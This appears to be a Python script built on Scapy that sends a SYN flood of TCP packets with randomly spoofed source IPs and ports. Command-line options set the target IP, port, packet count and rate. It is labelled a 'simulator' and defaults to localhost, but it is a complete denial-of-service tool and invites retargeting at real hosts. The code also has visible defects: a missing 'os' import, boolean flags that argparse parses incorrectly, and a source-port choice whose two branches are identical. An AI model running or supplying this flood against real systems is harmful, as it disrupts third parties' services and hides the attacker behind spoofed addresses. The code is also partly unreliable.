from scapy.all import IP, TCP, send
import random
import time
import argparse

# --- Configuration for the SYN Flood ---
TARGET_IP = "127.0.0.1"  # Target is localhost for simulation. Change to a real target if allowed and you understand the risks.
TARGET_PORT = 80         # Common target port (e.g., HTTP). Can be changed.
NUM_PACKETS = 1000       # Number of SYN packets to send. Adjust for desired attack intensity.
PACKET_DELAY = 0.001     # Delay between sending packets (in seconds). Prevents overwhelming the system.
SPOOF_SOURCE_IP = True   # Set to True to use random (spoofed) source IPs.
SPOOF_SOURCE_PORT = True # Set to True to use random source ports.

def generate_random_ip():
    """Generates a random IP address (can be used for spoofing)."""
    return ".".join(map(str, (random.randint(1, 254) for _ in range(4))))

def run_syn_flood(target_ip, target_port, num_packets, packet_delay, spoof_ip, spoof_port):
    """
    Simulates a SYN flood attack by sending a specified number of SYN packets.
    """
    print(f"[DDoS SIM] Starting SYN Flood attack on {target_ip}:{target_port}...")
    print(f"[DDoS SIM] Sending {num_packets} packets with {packet_delay}s delay...")
    if spoof_ip:
        print("[DDoS SIM] Source IPs will be spoofed.")
    if spoof_port:
        print("[DDoS SIM] Source Ports will be randomized.")

    start_time = time.time()
    
    for i in range(num_packets):
        # Determine source IP
        src_ip = generate_random_ip() if spoof_ip else "127.0.0.1" # Use localhost if not spoofing

        # Determine source port
        src_port = random.randint(1024, 65535) if spoof_port else random.randint(1024, 65535) # Use random ephemeral port

        # Create IP layer
        ip_layer = IP(src=src_ip, dst=target_ip)
        
        # Create TCP layer with SYN flag (S)
        tcp_layer = TCP(sport=src_port, dport=target_port, flags="S")
        
        # Combine layers
        packet = ip_layer / tcp_layer
        
        # Send the packet (verbose=0 suppresses Scapy's default output)
        send(packet, verbose=0)
        
        if (i + 1) % 100 == 0:
            print(f"[DDoS SIM] Sent {i+1}/{num_packets} packets...")
        
        time.sleep(packet_delay) # Introduce a delay

    end_time = time.time()
    duration = end_time - start_time
    print(f"[DDoS SIM] SYN Flood attack complete. Sent {num_packets} packets in {duration:.2f} seconds.")
    print(f"[DDoS SIM] Average rate: {num_packets / duration:.2f} packets/second.")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SYN Flood DDoS Attack Simulator.")
    parser.add_argument('--target_ip', type=str, default=TARGET_IP, help=f'Target IP address (default: {TARGET_IP})')
    parser.add_argument('--target_port', type=int, default=TARGET_PORT, help=f'Target port (default: {TARGET_PORT})')
    parser.add_argument('--num_packets', type=int, default=NUM_PACKETS, help=f'Number of SYN packets to send (default: {NUM_PACKETS})')
    parser.add_argument('--delay', type=float, default=PACKET_DELAY, help=f'Delay between packets in seconds (default: {PACKET_DELAY})')
    parser.add_argument('--spoof_ip', type=bool, default=SPOOF_SOURCE_IP, help=f'Spoof source IP addresses (default: {SPOOF_SOURCE_IP})')
    parser.add_argument('--spoof_port', type=bool, default=SPOOF_SOURCE_PORT, help=f'Spoof source ports (default: {SPOOF_SOURCE_PORT})')
    
    args = parser.parse_args()

    # Important: Scapy needs root privileges to send raw packets
    if os.geteuid() != 0:
        print("WARNING: This script requires root privileges to send raw packets.")
        print("Please run with 'sudo python3 simulate_ddos_syn_flood.py --target_ip ...'")
    else:
        run_syn_flood(args.target_ip, args.target_port, args.num_packets, args.delay, args.spoof_ip, args.spoof_port)
